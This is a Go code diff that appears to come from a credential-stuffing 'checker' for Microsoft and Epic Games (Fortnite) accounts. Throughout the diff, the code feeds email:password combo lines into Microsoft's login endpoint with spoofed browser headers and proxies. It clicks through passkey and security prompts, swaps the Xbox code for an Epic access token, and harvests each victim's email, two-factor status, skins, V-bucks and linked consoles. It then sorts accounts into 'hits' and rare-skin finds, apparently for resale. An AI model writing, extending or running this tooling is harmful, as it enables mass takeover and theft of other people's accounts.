-        GetStats().ExportFA(acc, displayName, skinCount, totalVbucks, epicEmail, tfaMethod, hasStw, lastPlayed)
-    }
+	AddToCpm(1)
+
+	jar, err2 := cookiejar.New(nil)
+	if err2 != nil {
+		LogError(fmt.Sprintf("Failed to create cookie jar for %s: %v", acc, err2))
+		GetStats().ExportRetries(acc, "failed to create cookie jar", true)
+		return false
+	}
+	session := &http.Client{Jar: jar}
+
+	var proxy string
+	if UseProxies && len(Proxies) > 0 {
+		proxy = Proxies[0]
+	}
+
+	creds := strings.SplitN(acc, ":", 2)
+	if len(creds) != 2 {
+		LogError(fmt.Sprintf("Invalid credentials format for %s", acc))
+		GetStats().ExportBads(acc, "Invalid credentials format")
+		return false
+	}
+	email, password := creds[0], creds[1]
+
+	GetStats().getSessionFolder()
+
+	var authResp *http.Response
+	var authBody string
+
+	for {
+		authURL := "https://login.live.com/ppsecure/post.srf?client_id=82023151-c27d-4fb5-8551-10c10724a55e&contextid=A31E247040285505&opid=F7304AA192830107&bk=1701944501&uaid=a7afddfca5ea44a8a2ee1bba76040b3c&pid=15216"
+		authHeaders := map[string]string{
+			"user-agent":                "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36",
+			"accept-encoding":           "gzip, deflate, br",
+			"accept":                    "*/*",
+			"connection":                "keep-alive",
+			"accept-language":           "en,en-US;q=0.9,en;q=0.8",
+			"cache-control":             "max-age=0",
+			"content-type":              "application/x-www-form-urlencoded",
+			"cookie":                    cookieValue,
+			"host":                      "login.live.com",
+			"origin":                    "https://login.live.com",
+			"referer":                   "https://login.live.com/oauth20_authorize.srf?client_id=82023151-c27d-4fb5-8551-10c10724a55e&redirect_uri=https%3A%2F%2Faccounts.epicgames.com%2FOAuthAuthorized&state=eyJpZCI6IjAzZDZhYmM1NDIzMjQ2Yjg5MWNhYmM2ODg0ZGNmMGMzIn0%3D&scope=xboxlive.signin&service_entity=undefined&force_verify=true&response_type=code&display=popup",
+			"sec-fetch-dest":            "document",
+			"sec-fetch-mode":            "navigate",
+			"sec-fetch-site":            "same-origin",
+			"sec-fetch-user":            "?1",
+			"upgrade-insecure-requests": "1",
+			"sec-ch-ua":                 "\"Not_A Brand\";v=\"99\", \"Google Chrome\";v=\"137\", \"Chromium\";v=\"137\"",
+			"sec-ch-ua-mobile":          "?0",
+			"sec-ch-ua-platform":        "\"Windows\"",
+		}
+
+		data := url.Values{}
+		data.Set("i13", "0")
+		data.Set("login", email)
+		data.Set("loginfmt", email)
+		data.Set("type", "11")
+		data.Set("LoginOptions", "3")
+		data.Set("lrt", "")
+		data.Set("lrtPartition", "")
+		data.Set("hisRegion", "")
+		data.Set("hisScaleUnit", "")
+		data.Set("passwd", password)
+		data.Set("ps", "2")
+		data.Set("psRNGCDefaultType", "1")
+		data.Set("psRNGCEntropy", "")
+		data.Set("psRNGCSLK", psRNGCSLKValue)
+		data.Set("canary", "")
+		data.Set("ctx", "")
+		data.Set("hpgrequestid", "")
+		data.Set("PPFT", ppftValue)
+		data.Set("PPSX", "Passp")
+		data.Set("NewUser", "1")
+		data.Set("FoundMSAs", "")
+		data.Set("fspost", "0")
+		data.Set("i21", "0")
+		data.Set("CookieDisclosure", "0")
+		data.Set("IsFidoSupported", "1")
+		data.Set("isSignupPost", "0")
+		data.Set("isRecoveryAttemptPost", "0")
+		data.Set("i19", "21648")
+
+		req, _ := http.NewRequest("POST", authURL, strings.NewReader(data.Encode()))
+
+		for key, value := range authHeaders {
+			req.Header.Set(key, value)
+		}
+
+		authResp, err2 = session.Do(req)
+		if err2 == nil && authResp.StatusCode == 200 {
+			break
+		}
+
+		if authResp != nil && authResp.StatusCode != 200 {
+			GetStats().ExportBads(acc, fmt.Sprintf("HTTP %d", authResp.StatusCode))
+			return false
+		}
+
+		if strings.Contains(err2.Error(), "ConnectionError") || strings.Contains(err2.Error(), "Timeout") {
+			time.Sleep(2 * time.Second)
+			continue
+		}
+
+		LogError(fmt.Sprintf("Error during authentication for %s: %v", acc, err2))
+		continue
+	}
+
+	defer authResp.Body.Close()
+
+	authBody, err2 = readResponseBody(authResp)
+	if err2 != nil {
+		LogError(fmt.Sprintf("Error reading auth resp2onse body for %s: %v", acc, err2))
+		return false
+	}
+
+
+	debugLog("Microsoft authentication response for %s: %s", acc, authBody)
+
+	if strings.Contains(strings.ToLower(authBody), "abuse?mkt=") || strings.Contains(strings.ToLower(authBody), "recover?mkt=") {
+		LogError(fmt.Sprintf("Account %s got abuse/recover response in Microsoft auth, marking as bad", acc))
+		GetStats().ExportBads(acc, "abuse/recover response in Microsoft auth")
+		return false
+	} else if strings.Contains(strings.ToLower(authBody), "cancel?mkt=") || strings.Contains(strings.ToLower(authBody), "passkey?mkt=") {
+		formURL := Parse(authBody, `action="`, `"`)
+
+		if formURL != "" {
+			var ruURL string
+			if strings.Contains(formURL, "ru=") {
+				ruStart := strings.Index(formURL, "ru=")
+				ruValueStart := ruStart + 3
+				ruValueEnd := len(formURL)
+
+				if ampIdx := strings.Index(formURL[ruValueStart:], "&"); ampIdx != -1 {
+					ruValueEnd = ruValueStart + ampIdx
+				}
+
+				ruURL = formURL[ruValueStart:ruValueEnd]
+
+				decodedRU, err2 := url.QueryUnescape(ruURL)
+				if err2 != nil {
+					decodedRU = ruURL
+				}
+
+				finalRU := decodedRU + "&res=success"
+
+					resp2, err2 := session.Get(finalRU)
+					if err2 != nil {
+						// fmt.Println("Error on cancel/passkey GET:", err2)
+					} else {
+						defer resp2.Body.Close()
+
+						resp2onseBody, err2 := readResponseBody(resp2)
+						if err2 != nil {
+							// fmt.Println("Error reading cancel/passkey resp2onse:", err2)
+							resp2onseBody = ""
+						}
+
+						if strings.Contains(strings.ToLower(resp2onseBody), "abuse?mkt=") || strings.Contains(strings.ToLower(resp2onseBody), "recover?mkt=") {
+							LogError(fmt.Sprintf("Account %s got abuse/recover response in cancel/passkey GET, marking as bad", acc))
+							GetStats().ExportBads(acc, "abuse/recover response in cancel/passkey GET")
+							return false
+						}
+
+						// fmt.Println("Response from cancel/passkey GET:", resp2onseBody)
+						logResponseToFile(acc, "cancel?mkt_GET", resp2onseBody)
+					}
+			} else {
+				decodedFormURL, err2 := url.QueryUnescape(formURL)
+				if err2 != nil {
+					decodedFormURL = formURL
+				}
+
+				resp2, err2 := session.Get(decodedFormURL)
+				if err2 != nil {
+					fmt.Println("Error on cancel/passkey POST:", err2)
+				} else {
+					defer resp2.Body.Close()
+
+					resp2onseBody, err2 := readResponseBody(resp2)
+					if err2 != nil {
+						fmt.Println("Error reading cancel/passkey resp2onse:", err2)
+						resp2onseBody = ""
+					}
+
+					if strings.Contains(strings.ToLower(resp2onseBody), "abuse?mkt=") || strings.Contains(strings.ToLower(resp2onseBody), "recover?mkt=") {
+						LogError(fmt.Sprintf("Account %s got abuse/recover response in cancel/passkey POST, marking as bad", acc))
+						GetStats().ExportBads(acc, "abuse/recover response in cancel/passkey POST")
+						return false
+					}
+
+					fmt.Println("Response from cancel/passkey POST:", resp2onseBody)
+					logResponseToFile(acc, "cancel?mkt_POST", resp2onseBody)
+				}
+			}
+		}
+	}
+
+	for _, keyword := range FailureKeywords {
+		if strings.Contains(strings.ToLower(authBody), strings.ToLower(keyword)) {
+			GetStats().ExportBads(acc, keyword)
+			return false
+		}
+	}
+
+	if strings.Contains(strings.ToLower(authBody), "cancel?mkt=") || strings.Contains(strings.ToLower(authBody), "passkey?mkt=") {
+		formURL := Parse(authBody, `action="`, `"`)
+		if formURL != "" {
+			var ruURL string
+			if strings.Contains(formURL, "ru=") {
+				ruStart := strings.Index(formURL, "ru=")
+				ruValueStart := ruStart + 3
+				ruValueEnd := len(formURL)
+
+				if ampIdx := strings.Index(formURL[ruValueStart:], "&"); ampIdx != -1 {
+					ruValueEnd = ruValueStart + ampIdx
+				}
+
+				ruURL = formURL[ruValueStart:ruValueEnd]
+
+				decodedRU, err2 := url.QueryUnescape(ruURL)
+				if err2 != nil {
+					decodedRU = ruURL
+				}
+
+				finalRU := decodedRU + "&res=success"
+
+				resp2, err2 := session.Get(finalRU)
+				if err2 != nil {
+					// fmt.Println("Error on cancel/passkey GET:", err2)
+				} else {
+					defer resp2.Body.Close()
+
+					responseBody, err2 := readResponseBody(resp2)
+					if err2 != nil {
+						// fmt.Println("Error reading cancel/passkey response:", err2)
+						responseBody = ""
+					}
+
+					if strings.Contains(strings.ToLower(responseBody), "abuse?mkt=") || strings.Contains(strings.ToLower(responseBody), "recover?mkt=") {
+						LogError(fmt.Sprintf("Account %s got abuse/recover response in cancel/passkey GET, marking as bad", acc))
+						GetStats().ExportBads(acc, "abuse/recover response in cancel/passkey GET")
+						return false
+					}
+
+					// fmt.Println("Response from cancel/passkey GET:", responseBody)
+					logResponseToFile(acc, "cancel?mkt_GET", responseBody)
+				}
+			} else {
+				decodedFormURL, err2 := url.QueryUnescape(formURL)
+				if err2 != nil {
+					decodedFormURL = formURL
+				}
+
+				resp2, err2 := session.Get(decodedFormURL)
+				if err2 != nil {
+					// fmt.Println("Error on cancel/passkey GET:", err2)
+				} else {
+					defer resp2.Body.Close()
+
+					responseBody, err2 := readResponseBody(resp2)
+					if err2 != nil {
+						// fmt.Println("Error reading cancel/passkey response:", err2)
+						responseBody = ""
+					}
+
+					if strings.Contains(strings.ToLower(responseBody), "abuse?mkt=") || strings.Contains(strings.ToLower(responseBody), "recover?mkt=") {
+						LogError(fmt.Sprintf("Account %s got abuse/recover response in cancel/passkey GET, marking as bad", acc))
+						GetStats().ExportBads(acc, "abuse/recover response in cancel/passkey GET")
+						return false
+					}
+
+					// fmt.Println("Response from cancel/passkey GET:", responseBody)
+					logResponseToFile(acc, "cancel?mkt_GET", responseBody)
+				}
+			}
+		}
+	}
+
+	if authResp.StatusCode == 429 || strings.Contains(authBody, "retry with a different device") {
+		if !UseProxies || len(Proxies) == 0 {
+			time.Sleep(2 * time.Second)
+			return false
+		} else {
+			GetStats().ExportRetries(acc, "rate limited", false)
+			return false
+		}
+	}
+
+	if authResp == nil || authResp.StatusCode != 200 {
+		LogError(fmt.Sprintf("Microsoft authentication failed for %s - no valid resp2onse", acc))
+		GetStats().ExportBads(acc, "Microsoft authentication failed")
+		return false
+	}
+	AddToMsHits(1)
+
+	transport := &http.Transport{
+		DisableCompression: false,
+	}
+
+	if proxy != "" {
+		proxyURL, err2 := url.Parse(proxy)
+		if err2 == nil {
+			transport.Proxy = http.ProxyURL(proxyURL)
+		}
+	}
+
+	epicGamesClient := &http.Client{
+		Transport: transport,
+		Jar:       jar,
+		Timeout:   30 * time.Second,
+	}
+
+	epicGames := &EpicGames{
+		client: epicGamesClient,
+	}
+
+	var xboxToken string
+	maxXboxRetries := 3
+	for attempt := 0; attempt < maxXboxRetries; attempt++ {
+		xboxAuthURL := "https://login.live.com/oauth20_authorize.srf?client_id=82023151-c27d-4fb5-8551-10c10724a55e&redirect_uri=https%3A%2F%2Faccounts.epicgames.com%2FOAuthAuthorized&state=&scope=xboxlive.signin&service_entity=undefined&force_verify=true&response_type=code&display=popup"
+
+		epicGames.client.CheckRedirect = func(req *http.Request, via []*http.Request) error {
+			return http.ErrUseLastResponse
+		}
+		defer func() { epicGames.client.CheckRedirect = nil }()
+
+		resp22, err22 := epicGames.client.Get(xboxAuthURL)
+		if err22 != nil {
+			if resp22 == nil {
+				LogError(fmt.Sprintf("Failed to get Xbox token for %s: %v", acc, err22))
+				GetStats().ExportBads(acc, "Failed to get Xbox token - initial GET failed")
+				return false
+			}
+		}
+		defer resp22.Body.Close()
+
+		location, err2 := resp22.Location()
+		if err2 != nil {
+			body, err2Read := readResponseBody(resp22)
+			if err2Read != nil {
+				LogError(fmt.Sprintf("Failed to get Xbox token for %s: %v", acc, err2Read))
+				GetStats().ExportBads(acc, "Failed to get Xbox token - error reading response body")
+				return false
+			}
+			if strings.Contains(strings.ToLower(body), "abuse?mkt=") || strings.Contains(strings.ToLower(body), "recover?mkt=") {
+				LogError(fmt.Sprintf("Account %s got abuse/recover response, marking as bad", acc))
+				GetStats().ExportBads(acc, "abuse/recover response")
+				return false
+			} else if strings.Contains(body, "cancel?mkt=") || strings.Contains(body, "passkey?mkt=") {
+				if ru := Parse(body, "ru=", "\""); ru != "" {
+					unquotedRU, _ := url.QueryUnescape(ru)
+					resp22, err2 = epicGames.client.Get(unquotedRU)
+					if err2 != nil && resp22 == nil {
+						LogError(fmt.Sprintf("Failed to get Xbox token for %s: %v", acc, err2))
+						GetStats().ExportBads(acc, "Failed to get Xbox token - ru GET request failed")
+						return false
+					}
+					defer resp22.Body.Close()
+					location, err2 = resp22.Location()
+					if err2 != nil {
+						LogError(fmt.Sprintf("Failed to get Xbox token for %s: %v", acc, err2))
+						GetStats().ExportBads(acc, "Failed to get Xbox token - no location from ru redirect")
+						return false
+					}
+				}
+			} else {
+				LogError(fmt.Sprintf("Failed to get Xbox token for %s: no location and no cancel/passkey in body", acc))
+				GetStats().ExportBads(acc, "Failed to get Xbox token - no location or cancel/passkey")
+				return false
+			}
+		}
+
+		if location == nil {
+			LogError(fmt.Sprintf("Failed to get Xbox token for %s: location was nil", acc))
+			GetStats().ExportBads(acc, "Failed to get Xbox token - location was nil")
+			return false
+		}
+
+		xboxToken = location.Query().Get("code")
+		if xboxToken == "" {
+			LogError(fmt.Sprintf("Failed to get Xbox token for %s: token not found in redirect", acc))
+			GetStats().ExportBads(acc, "Failed to get Xbox token - token not found in redirect")
+			return false
+		}
+		break
+	}
+
+	transport = &http.Transport{
+		DisableCompression: false,
+	}
+
+	if proxy != "" {
+		proxyURL, err2 := url.Parse(proxy)
+		if err2 == nil {
+			transport.Proxy = http.ProxyURL(proxyURL)
+		}
+	}
+
+	epicGamesRetryClient := &http.Client{
+		Transport: transport,
+		Jar:       jar,
+		Timeout:   30 * time.Second,
+	}
+
+	epicGamesRetry := &EpicGames{
+		client: epicGamesRetryClient,
+	}
+
+	var xboxAuthURL string = "https://login.live.com/oauth20_authorize.srf?client_id=82023151-c27d-4fb5-8551-10c10724a55e&redirect_uri=https%3A%2F%2Faccounts.epicgames.com%2FOAuthAuthorized&state=&scope=xboxlive.signin&service_entity=undefined&force_verify=true&response_type=code&display=popup"
+	var location *url.URL
+	var resp22 *http.Response
+
+	epicGamesRetry.client.CheckRedirect = func(req *http.Request, via []*http.Request) error {
+		return http.ErrUseLastResponse
+	}
+	defer func() { epicGamesRetry.client.CheckRedirect = nil }()
+
+	var resp2 *http.Response
+	resp2, err2 = epicGamesRetry.client.Get(xboxAuthURL)
+	if err2 != nil {
+		if resp2 == nil {
+			LogError(fmt.Sprintf("Failed to get Xbox token for retry for %s: %v", acc, err2))
+			GetStats().ExportBads(acc, "Failed to get Xbox token for retry")
+			return false
+		}
+	}
+	defer resp2.Body.Close()
+
+	location, err2 = resp2.Location()
+	if err2 != nil {
+		var body string
+		var err2Read error
+		body, err2Read = readResponseBody(resp2)
+		if err2Read != nil {
+			LogError(fmt.Sprintf("Failed to get Xbox token for retry for %s: %v", acc, err2Read))
+			GetStats().ExportBads(acc, "Failed to get Xbox token for retry - error reading resp2onse body")
+			return false
+		}
+		if strings.Contains(strings.ToLower(body), "abuse?mkt=") || strings.Contains(strings.ToLower(body), "recover?mkt=") {
+			LogError(fmt.Sprintf("Account %s got abuse/recover response on retry, marking as bad", acc))
+			GetStats().ExportBads(acc, "abuse/recover response on retry")
+			return false
+		} else if strings.Contains(body, "cancel?mkt=") || strings.Contains(body, "passkey?mkt=") {
+			if ru := Parse(body, "ru=", "\""); ru != "" {
+				unquotedRU, _ := url.QueryUnescape(ru)
+				resp2, err2 = epicGamesRetry.client.Get(unquotedRU)
+				if err2 != nil && resp2 == nil {
+					LogError(fmt.Sprintf("Failed to get Xbox token for retry for %s: %v", acc, err2))
+					GetStats().ExportBads(acc, "Failed to get Xbox token for retry - ru GET request failed")
+					return false
+				}
+				defer resp22.Body.Close()
+				location, err2 = resp22.Location()
+				if err2 != nil {
+					LogError(fmt.Sprintf("Failed to get Xbox token for retry for %s: %v", acc, err2))
+					GetStats().ExportBads(acc, "Failed to get Xbox token for retry - no location from ru redirect")
+					return false
+				}
+			}
+		} else {
+			LogError(fmt.Sprintf("Failed to get Xbox token for retry for %s: no location and no cancel/passkey in body", acc))
+			GetStats().ExportBads(acc, "Failed to get Xbox token for retry - no location or cancel/passkey")
+			return false
+		}
+	}
+
+	if location == nil {
+		LogError(fmt.Sprintf("Failed to get Xbox token for retry for %s: location was nil", acc))
+		GetStats().ExportBads(acc, "Failed to get Xbox token for retry - location was nil")
+		return false
+	}
+
+	xboxToken = location.Query().Get("code")
+	if xboxToken == "" {
+		LogError(fmt.Sprintf("Failed to get Xbox token for retry for %s: token not found in redirect", acc))
+		GetStats().ExportBads(acc, "Failed to get Xbox token for retry - token not found in redirect")
+		return false
+	}
+
+	data := url.Values{}
+	data.Set("grant_type", "external_auth")
+	data.Set("external_auth_type", "xbl")
+	data.Set("external_auth_token", xboxToken)
+
+	req, _ := http.NewRequest("POST", "https://account-public-service-prod.ol.epicgames.com/account/api/oauth/token", strings.NewReader(data.Encode()))
+	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
+	req.Header.Set("Authorization", "basic ZWM2ODRiOGM2ODdmNDc5ZmFkZWEzY2IyYWQ4M2Y1YzY6ZTFmMzFjMjExZjI4NDEzMTg2MjYyZDM3YTEzZmM4NGQ=")
+	req.Header.Set("User-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36")
+
+	for i := 0; i < 3; i++ {
+		resp2, err2 = http.DefaultClient.Do(req)
+		if err2 == nil {
+			break
+		}
+		time.Sleep(5 * time.Second)
+	}
+	if err2 != nil {
+		LogError(fmt.Sprintf("Xbox token exchange failed for %s: %v", acc, err2))
+		GetStats().ExportRetries(acc, err2.Error(), true)
+		return false
+	}
+	defer resp2.Body.Close()
+
+	var body string
+	body, err2 = readResponseBody(resp2)
+	if err2 != nil {
+		LogError(fmt.Sprintf("Xbox token exchange failed for %s: %v", acc, err2))
+		GetStats().ExportRetries(acc, err2.Error(), true)
+		return false
+	}
+	bodyStr := body
+	debugLog("Xbox token exchange response: %s", bodyStr)
+
+	var accountID, displayName, accessToken string
+
+	if strings.Contains(bodyStr, "errors.com.epicgames.account.identity_provider.api_error") {
+		accountID = "retry"
+		displayName = "retry"
+		accessToken = "retry"
+	} else if strings.Contains(bodyStr, "errors.com.epicgames.account.ext_auth.invalid_external_auth_token") {
+		accountID = "invalid"
+		displayName = "invalid"
+		accessToken = "invalid"
+	} else if strings.Contains(bodyStr, "errors.com.epicgames.account.account_not_active") || strings.Contains(bodyStr, "sorry the account you are using is not active") {
+		accountID = "inactive"
+		displayName = "inactive"
+		accessToken = "inactive"
+	} else if strings.Contains(bodyStr, "correctiveAction\":\"DATE_OF_BIRTH") || strings.Contains(bodyStr, "account_review_details_required") {
+		accountID = "headless"
+		displayName = "headless"
+		accessToken = "headless"
+		CurrentAccountHeadless = true
+	} else {
+		var result map[string]interface{}
+		if err2 := json.Unmarshal([]byte(bodyStr), &result); err2 != nil {
+			LogError(fmt.Sprintf("Failed to parse Xbox exchange response for %s: %v", acc, err2))
+			GetStats().ExportRetries(acc, "Failed to parse Xbox exchange resp2onse", true)
+			return false
+		}
+
+		if accountIDVal, ok := result["account_id"]; ok && accountIDVal != nil {
+			accountID, _ = accountIDVal.(string)
+		} else {
+			accountID = ""
+		}
+
+		if displayNameVal, ok := result["displayName"]; ok && displayNameVal != nil {
+			displayName, _ = displayNameVal.(string)
+		} else {
+			displayName = ""
+		}
+
+		if accessTokenVal, ok := result["access_token"]; ok && accessTokenVal != nil {
+			accessToken, _ = accessTokenVal.(string)
+		} else {
+			accessToken = ""
+		}
+	}
+	if err2 != nil {
+		LogError(fmt.Sprintf("Xbox token exchange failed for %s: %v", acc, err2))
+		GetStats().ExportRetries(acc, err2.Error(), true)
+		return false
+	}
+
+	if accountID == "retry" {
+		LogError(fmt.Sprintf("Retrying account %s due to identity provider error", acc))
+		GetStats().ExportRetries(acc, "identity provider error", false)
+		return false
+	}
+	if accountID == "invalid" {
+		LogError(fmt.Sprintf("Account %s has invalid external auth token", acc))
+		GetStats().ExportBads(acc, "Invalid external auth token")
+		return false
+	}
+	if accountID == "inactive" {
+		LogError(fmt.Sprintf("Account %s is inactive", acc))
+		GetStats().ExportBads(acc, "Inactive account")
+		return false
+	}
+	if accountID == "headless" {
+		AddToHeadless(1)
+		CurrentAccountHeadless = true
+		GetStats().ExportHeadless(acc, "Requires DOB", "none", "none", "N/A", 0, 0, false)
+		return true
+	}
+	if accessToken == "" {
+		LogError(fmt.Sprintf("Received empty access token for %s", acc))
+		GetStats().ExportRetries(acc, "empty access token", true)
+		return false
+	}
+
+	var accountData map[string]interface{}
+	results := make(map[string]interface{})
+	var wg sync.WaitGroup
+	var mu sync.Mutex
+
+	client := &http.Client{Timeout: 10 * time.Second}
+
+	fetch := func(url, method string, headers map[string]string, key string) {
+		defer wg.Done()
+		var req *http.Request
+		var err2 error
+		if method == "POST" {
+			req, err2 = http.NewRequest("POST", url, strings.NewReader("{}"))
+		} else {
+			req, err2 = http.NewRequest("GET", url, nil)
+		}
+		if err2 != nil {
+			return
+		}
+		for h, v := range headers {
+			req.Header.Set(h, v)
+		}
+
+		resp2, err2 := client.Do(req)
+		if err2 != nil {
+			return
+		}
+		defer resp2.Body.Close()
+
+		body, err2 := readResponseBody(resp2)
+		if err2 != nil {
+			return
+		}
+		mu.Lock()
+		results[key] = []byte(body)
+		mu.Unlock()
+	}
+
+	wg.Add(6)
+
+	go fetch("https://account-public-service-prod.ol.epicgames.com/account/api/public/account/"+accountID, "GET", map[string]string{"Authorization": "Bearer " + accessToken}, "account")
+	go fetch("https://fortnite-public-service-prod11.ol.epicgames.com/fortnite/api/game/v2/profile/"+accountID+"/client/QueryProfile?profileId=athena&rvn=-1", "POST", map[string]string{"Authorization": "Bearer " + accessToken, "Content-Type": "application/json"}, "fortnite")
+	go fetch("https://statsproxy-public-service-live.ol.epicgames.com/statsproxy/api/statsv2/account/"+accountID, "GET", map[string]string{"Authorization": "Bearer " + accessToken, "Content-Type": "application/json"}, "stats")
+	go fetch("https://fortnite-public-service-prod11.ol.epicgames.com/fortnite/api/game/v2/profile/"+accountID+"/client/QueryProfile?profileId=common_core&rvn=-1", "POST", map[string]string{"Authorization": "Bearer " + accessToken, "Content-Type": "application/json"}, "vbucks")
+	go fetch("https://entitlement-public-service-prod08.ol.epicgames.com/entitlement/api/account/"+accountID+"/entitlements", "GET", map[string]string{"Authorization": "Bearer " + accessToken, "Content-Type": "application/json"}, "stw")
+	go fetch("https://account-public-service-prod.ol.epicgames.com/account/api/public/account/"+accountID+"/externalAuths", "GET", map[string]string{"Authorization": "Bearer " + accessToken, "Content-Type": "application/json"}, "linked")
+
+	wg.Wait()
+
+	processedResults := make(map[string]interface{})
+	debugLog("Processing account data results for account: %s", accountID)
+
+	var epicEmail string = "none"
+	var tfaEnabled string = "unknown"
+	var tfaMethod string = ""
+	var emailVerified string = "unknown"
+	var skinsList string = ""
+	var rawSkinsList []string
+	var skinCount int = 0
+	var lastPlayed string = "N/A"
+	var totalVbucks int = 0
+	var hasStw bool = false
+	var hasPsn bool = false
+	var hasNintendo bool = false
+
+	if accountData, ok := results["account"]; ok {
+		var account map[string]interface{}
+		json.Unmarshal(accountData.([]byte), &account)
+
+		if email, ok := account["email"].(string); ok {
+			epicEmail = email
+		}
+		if tfa, ok := account["tfaEnabled"].(bool); ok {
+			tfaEnabled = strings.ToLower(fmt.Sprintf("%t", tfa))
+		}
+		if tfaMethodVal, ok := account["twoFactorMethod"]; ok && tfaMethodVal != nil {
+			if method, ok := tfaMethodVal.(string); ok {
+				tfaMethod = strings.ToLower(method)
+			}
+		} else if authMethod, ok := account["twoFactorAuthMethod"]; ok && authMethod != nil {
+			if method, ok := authMethod.(string); ok {
+				tfaMethod = strings.ToLower(method)
+			}
+		} else if mfaVal, ok := account["mfaMethod"]; ok && mfaVal != nil {
+			if method, ok := mfaVal.(string); ok {
+				tfaMethod = strings.ToLower(method)
+			}
+		} else if tfaProvider, ok := account["tfaProvider"]; ok && tfaProvider != nil {
+			if method, ok := tfaProvider.(string); ok {
+				tfaMethod = strings.ToLower(method)
+			}
+		} else if authType, ok := account["twoFactorAuthType"]; ok && authType != nil {
+			if method, ok := authType.(string); ok {
+				tfaMethod = strings.ToLower(method)
+			}
+		} else if authType2, ok := account["tfaType"]; ok && authType2 != nil {
+			if method, ok := authType2.(string); ok {
+				tfaMethod = strings.ToLower(method)
+			}
+		}
+		if verified, ok := account["emailVerified"].(bool); ok {
+			emailVerified = strings.ToLower(fmt.Sprintf("%t", verified))
+		}
+
+		if displayNameVal, ok := account["displayName"].(string); ok {
+			displayName = displayNameVal
+		}
+	}
+
+	processedResults["epic_email"] = epicEmail
+	processedResults["tfa_enabled"] = tfaEnabled
+	processedResults["email_verified"] = emailVerified
+	processedResults["displayName"] = displayName
+
+	if fortniteData, ok := results["fortnite"]; ok {
+		fortniteText := string(fortniteData.([]byte))
+
+		var fortniteJSON map[string]interface{}
+		if json.Unmarshal([]byte(fortniteText), &fortniteJSON) == nil {
+			if profileChanges, ok := fortniteJSON["profileChanges"].([]interface{}); ok && len(profileChanges) > 0 {
+				if change, ok := profileChanges[0].(map[string]interface{}); ok {
+					if profile, ok := change["profile"].(map[string]interface{}); ok {
+						if items, ok := profile["items"].(map[string]interface{}); ok {
+							for _, item := range items {
+								if itemMap, ok := item.(map[string]interface{}); ok {
+									if templateID, ok := itemMap["templateId"].(string); ok {
+										if strings.HasPrefix(templateID, "AthenaCharacter:") {
+											rawSkinsList = append(rawSkinsList, templateID)
+										}
+									}
+								}
+							}
+						}
+
+						if stats, ok := profile["stats"].(map[string]interface{}); ok {
+							if attributes, ok := stats["attributes"].(map[string]interface{}); ok {
+								if lastMatch, ok := attributes["last_match_end_datetime"].(string); ok {
+									if strings.Contains(lastMatch, "T") {
+										lastPlayed = strings.Split(lastMatch, "T")[0]
+									} else {
+										lastPlayed = lastMatch
+									}
+								}
+							}
+						}
+					}
+				}
+			}
+		}
+
+		uniqueSkins := make(map[string]bool)
+		for _, skin := range rawSkinsList {
+			uniqueSkins[skin] = true
+		}
+		skinCount = len(uniqueSkins)
+
+		var mappedSkins []string
+		for skin := range uniqueSkins {
+			skinID := strings.ToLower(strings.TrimPrefix(skin, "AthenaCharacter:"))
+			if name, ok := Mapping[skinID]; ok {
+				mappedSkins = append(mappedSkins, name)
+			} else {
+				// Fallback for unmapped common skins
+				if strings.Contains(skinID, "cid_defaultoutfit") {
+					mappedSkins = append(mappedSkins, "Default Outfit")
+				} else {
+					mappedSkins = append(mappedSkins, strings.TrimPrefix(skin, "AthenaCharacter:"))
+				}
+			}
+		}
+		skinsList = strings.Join(mappedSkins, ", ")
+	}
+
+	processedResults["skins_list"] = skinsList
+	processedResults["raw_skins_list"] = rawSkinsList
+	processedResults["skin_count"] = skinCount
+	processedResults["last_played"] = lastPlayed
+
+	totalVbucks = 0
+	if vbucksData, ok := results["vbucks"]; ok {
+		var vbucksJSON map[string]interface{}
+		if json.Unmarshal(vbucksData.([]byte), &vbucksJSON) == nil {
+			if profileChanges, ok := vbucksJSON["profileChanges"].([]interface{}); ok {
+				for _, change := range profileChanges {
+					if changeMap, ok := change.(map[string]interface{}); ok {
+						if profile, ok := changeMap["profile"].(map[string]interface{}); ok {
+							if items, ok := profile["items"].(map[string]interface{}); ok {
+								for _, item := range items {
+									if itemMap, ok := item.(map[string]interface{}); ok {
+										if templateID, ok := itemMap["templateId"].(string); ok {
+											if strings.HasPrefix(templateID, "Currency:Mtx") {
+												if quantity, ok := itemMap["quantity"].(float64); ok {
+													totalVbucks += int(quantity)
+												}
+											}
+										}
+									}
+								}
+							}
+						}
+					}
+				}
+			}
+		}
+	}
+	processedResults["total_vbucks"] = totalVbucks
+
+	hasStw = false
+	if stwData, ok := results["stw"]; ok {
+		stwText := string(stwData.([]byte))
+		hasStw = strings.Contains(stwText, "entitlementName\":\"Fortnite_Founder\"")
+	}
+	processedResults["has_stw"] = hasStw
+
+	if linkedData, ok := results["linked"]; ok {
+		linkedText := string(linkedData.([]byte))
+		hasPsn = !strings.Contains(linkedText, "\"type\":\"psn\",")
+		hasNintendo = !strings.Contains(linkedText, "\"type\":\"nintendo\",")
+	}
+	processedResults["has_psn"] = hasPsn
+	processedResults["has_nintendo"] = hasNintendo
+
+	accountData = processedResults
+
+	epicEmail = accountData["epic_email"].(string)
+	tfaEnabled = accountData["tfa_enabled"].(string)
+	emailVerified = accountData["email_verified"].(string)
+	skinsList = accountData["skins_list"].(string)
+	rawSkinsList = accountData["raw_skins_list"].([]string)
+	skinCount = accountData["skin_count"].(int)
+	lastPlayed = accountData["last_played"].(string)
+	totalVbucks = accountData["total_vbucks"].(int)
+	hasStw = accountData["has_stw"].(bool)
+	hasPsn = accountData["has_psn"].(bool)
+	hasNintendo = accountData["has_nintendo"].(bool)
+
+	isFA := strings.ToLower(epicEmail) == strings.ToLower(email)
+
+	_, ogSkinsFound, rareSkinsFound := checkRareSkins(skinsList, rawSkinsList)
+
+ 
+
+if totalVbucks > 1000 {
+    saveVbucksHit(acc, totalVbucks)
+}
+
+if len(ogSkinsFound) > 0 || len(rareSkinsFound) > 0 {
+    AddToRares(1)
+}
+	ExportLock.Lock()
+	AddToHits(1)
+
+GetStats().ExportHit(acc, displayName, epicEmail, tfaMethod, lastPlayed, tfaEnabled, emailVerified, skinCount, totalVbucks, hasStw, CurrentAccountHeadless, ogSkinsFound, rareSkinsFound)
+
+	if isFA {
